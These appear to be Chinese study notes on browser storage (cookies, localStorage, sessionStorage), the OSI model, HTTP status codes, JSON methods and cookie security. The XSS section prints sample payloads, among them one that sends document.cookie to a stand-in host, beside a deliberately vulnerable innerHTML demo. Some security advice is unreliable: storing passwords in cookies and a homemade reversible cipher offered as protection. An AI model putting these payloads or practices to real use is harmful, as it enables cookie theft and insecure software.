#cookie，localStorage，sessionStorage的区别
		cookie是在HTML4中使用的给客户端保存数据的，也可以和session配合实现跟踪浏览器用户身份；
		而webstorage（包括：localStorage和sessionStorage）是在HTML5提出来的，纯粹为了保存数据，不会与服务器端通信。
		WebStorage两个主要目标：（1）提供一种在cookie之外存储会话数据的路径。（2）提供一种存储大量可以跨会话存在的数据的机制。
	
	相同点：
		cookie，localStorage，sessionStorage都是在客户端保存数据的，存储数据的类型：都是字符串。
	
	不同点：
		1、生命周期：
			1）、cookie如果不设置有效期，那么就是临时存储（存储在内存中），是会话级别的，会话结束后，cookie也就失效了，如果设置了有效期，那么cookie存储在硬盘里，有效期到了，就自动消失了。
			2）、localStorage的生命周期是永久的，关闭页面或浏览器之后localStorage中的数据也不会消失。localStorage除非主动删除数据，否则数据永远不会消失。
			3）、sessionStorage仅在当前会话下有效。sessionStorage引入了一个“浏览器窗口”的概念，sessionStorage是在同源的窗口中始终存在的数据。只要这个浏览器窗口没有关闭，即使刷新页面或者进入同源另一个页面，数据依然存在。但是sessionStorage在关闭了浏览器窗口后就会被销毁。同时独立的打开同一个窗口同一个页面，sessionStorage也是不一样的。

		2、网络流量：
			cookie的数据每次都会发给服务器端，而localstorage和sessionStorage不会与服务器端通信，纯粹为了保存数据，所以，webstorage更加节约网络流量。

		3、大小限制：
			cookie大小限制在4KB，非常小；localstorage和sessionStorage在5M

		4、安全性：
			WebStorage不会随着HTTP header发送到服务器端，所以安全性相对于cookie来说比较高一些，不会担心截获。

		5、使用方便性上：
			WebStorage提供了一些方法，数据操作比cookie方便；
			setItem (key, value) ——  保存数据，以键值对的方式储存信息。
			getItem (key) ——  获取数据，将键值传入，即可获取到对应的value值。
			removeItem (key) ——  删除单个数据，根据键值移除对应的信息。
			clear () ——  删除所有的数据
			key (index) —— 获取某个索引的key
	
## 通信协议
	为了能够让不同设备通过网络进行互联互通、数据交互，必须规定大家都要遵守的标准“通信协议”。当前ISO标准是7层网络模型：
	（1）应用层：对应应用程序的通信服务的。示例：telnet，HTTP,FTP,WWW,NFS,SMTP等。
	（2）表示层：定义数据格式及加密，例：FTP以二进制或ASCII格式传输。
	（3）会话层：完成连续消息通知表示层，表示层看到的数据是连续的。示例：RPC，SQL等。
	（4）传输层：不同应用的数据流的输入进行复用，数据包的重新排序功能。示例：TCP，UDP，SPX。
	（5）网络层：定义逻辑地址，路由实现的方式。示例：IP,IPX等。
	（6）数据链路层：如何将数据组合成数据块（帧）传送，如何处理传输差错。示例：ATM，FDDI等。
	（7）物理层：有关传输介质的特性标准。连接头、针、针的使用、电流等。示例：Rj45，802.3等。
	
	互联网使用TCP/IP协议：
		联网设备地址使用IP协议，如何打包数据，数据包编号使用TCP协议。
		TCP把应用程序的数据分割打成IP包，IP负责把包传给目标设备。
	
## HTTP
	http（超文本传输协议）是一个基于请求与响应的应用层协议。
	url请求资源的地址 http://host[":"port][abs_path]
	host 主机名，对应IP地址的一个点或一段；port 端口号 ；abs_path 主机上的资源路径
	
	请求方式：
		get请求，将请求数据作为url一部分发送，不安全，传输数据量小，方便易用。
		post请求，传输数据量大，安全，一般做表单提交。

	常见响应状态码：
		200 OK //客户端请求成功
		400 Bad Request //客户端请求有语法错误，不能被服务器所理解
		401 Unauthorized //请求未经授权，这个状态代码必须和WWW-Authenticate报头域一起使用
		403 Forbidden //服务器收到请求，但是拒绝提供服务
		404 Not Found //请求资源不存在，输入了错误的URL
		500 Internal Server Error //服务器发生不可预期的错误
		503 Server Unavailable //服务器当前不能处理客户端的请求，一段时间后可能恢复正常
	
## Cookie的概念
	cookie 是存储于访问者的计算机中的变量。每当同一台计算机通过浏览器请求某个页面时，就会发送这个 cookie。你可以使用 JavaScript 来创建和取回 cookie 的值。
	
	你可以把用户的登录名密码存储于cookie中，就可以实现自动登录。也可以用来保存购物车信息。
	
	Cookie的特点:
		（1）cookie可能被禁用。
		（2）cookie是与浏览器相关的。不同浏览器所保存的cookie也是不能互相访问的。
		（3）cookie可能被用户删除。
		（4）cookie安全性不够高。如果要保存用户名密码等信息时，最好事先经过加密处理。
		（5）存储的数据量 4k 大小，cookie只支持存储string类型的数据。
		（6）简单易用。
		（7）信息存储于用户硬盘，因此可以作为全局变量。
	
## Cookie格式
	cookie就是一串字符串，格式就是键值对，分号隔开，三个属性可有可无
	
	cookieName=cookieValue;expires=GMTString;path=URLpath;domain=siteDomain
	cookie名称 cookie值 失效日期 可访问url 可访问主机
	document.cookie=“cookieName=cookieValue”;//设置cookie

	没有指定失效日期的cookie在浏览器关闭后就消失。
	可访问url指定网站下能够访问cookie的路径。例：/shop
	可访问主机指定可访问cookie的主机名。例：www.163.com和mail.163.com指定为163.com
	注：失效日期由date.toGMTString（）方法取得。
	
## 写入/读取cookie	
	写入7天后过期的cookie
	var date=new Date();
	date.setDate(date.getDate()+7);
	document.cookie="userName=zhang; expires="+date.toGMTString();
	document.cookie="userPws=123456; expires="+date.toGMTString();
	
	读取上边写入的cookie，因为cookie每次是全部获取，所以需要自己写解析cookie的代码。
		var uname,upws;
		var cookiearr=document.cookie.split("; ");
		for(var i=0;i<cookiearr.length;i++){
			var coocieItem=cookiearr[i].split("=");
			if(coocieItem[0]=="userName"){
				uname=coocieItem [1];
			}
			if(coocieItem[0]=="userPws"){
				upws=coocieItem [1];
			}
		}
	
## Cookie的其他操作
	添加与覆盖：
		浏览器用cookie名称来区别cookie，添加不同名称cookie会一直续在前一个cookie后，同名的cookie会覆盖值。

	删除cookie：
		不能直接删除cookie，但是设置失效日期为过去，浏览器会删除cookie。

	中文及特殊字符支持：
		使用escape（）函数编码cookie值，读取时使用unescape（）函数解码。

	判断cookie是否存在：
		document.cookie.indexOf(NameOfCookie+“=”); //使用字符串函数indexOf
	例：document.cookie=“str=”+escape(“I love ajax”);相当于document.cookie="str=I%20love%20ajax";	
	
## Json2的方法	
	JSON2.js文件提供字符串转JSON和JSON转字符串的方法
	JSON.parse()【从一个字符串中解析出JSON对象】
	
	例子：
		var data='{"name":"goatling"}'
		JSON.parse(data)
	结果是：
		{name:"goatling“}
		JSON.stringify()【从一个JSON对象中解析出字符串】
		var data={name:'goatling'}
		JSON.stringify(data)
	结果是：
		'{"name":"goatling"}‘

## cookie的安全策略
	XSS攻击：
		跨站脚本攻击(Cross Site Scripting)，为不和层叠样式表(Cascading Style Sheets, CSS)的缩写混淆，故将跨站脚本攻击缩写为XSS。恶意攻击者往Web页面里插入恶意Script代码，当用户浏览该页之时，嵌入其中Web里面的Script代码会被执行，从而达到恶意攻击用户的目的。
	
### cookie的安全策略（攻击代码示例）
	html代码
	<body>
		<span id="s"></span>
		<textarea id="txtId" style="width:200px;height:200px" ></textarea>
		<input id="btn" type="button" value="测试" />
	</body>

	script代码
	window.onload = function(){
		document.getElementById("btn").onclick = function(){
			document.getElementById("s").innerHTML = document.getElementById("txtId").value;
		}
	}
	
	运行html页面，在文本域里输入：
		<a href="" onclick="javascript:{alert('dd');for(var i=0;i<10;i++){alert(i)}}" >百度</a>
	
## XSS攻击：
	XSS攻击：
	<script>alert(document.cookie)</script>
	<a href="" onclick="javascript:(function(){alert(444);})()">超级</a>
	这段代码能够发送当前cookie到www.xxx.com
	<img src='http://www.xxx.com?cookie='+document.cookie;/> 
	cookie欺骗：
		拿到cookie后，分析出用户名和密码，然后修改自己的cookie为分析出的用户名密码，访问网站成功登录。

	如何防范：
		1，Html转码（防止“<”等特殊字符，防止注入js）
		2，敏感信息加密
		3，cookie和ip地址绑定（cookie检查ip地址，ip和cookie不符的不能登录，需要服务器端配合）
	
	//加密 abcd 经过compile() 后 e
	function compile(code){
		var c=String.fromCharCode(code.charCodeAt(0)+code.length);
			for(var i=1;i<code.length;i++){
				c+=String.fromCharCode(code.charCodeAt(i)+code.charCodeAt(i-1));
			}
			return(escape(c));
		}
		
	//解密
	function uncompile(code){
	code=unescape(code);
	var c=String.fromCharCode(code.charCodeAt(0)-code.length);
		for(var i=1;i<code.length;i++){
			c+=String.fromCharCode(code.charCodeAt(i)-c.charCodeAt(i-1));
		}
		return c; 
	}
	
## Cookie的封装	
	设置cookie
	function setCookie (key, value, t) {
		var oDate = new Date();
		oDate.setDate(oDate.getDate() + t);
		document.cookie = key + ‘=’ +escape(value) + '; expires=' + oDate.toGMTString()
	}
	
	获取cookie
	function getCookie (key) {
		var arr1 = document.cookie.split(';');
		for( var i=0;i<arr1.length; i++ ) {
			var arr2 = arr1[i].split('=');
			if( arr2[0] == key ){
				return unescape(arr2[1]);
			}
		}
	}

	判断浏览器是否禁用cookie
		var cookieEnabled=(navigator.cookieEnabled)? true : false
	
	移除cookie
	function removeCookie (key) {
		setCookie(key, ' ', -1);
	}	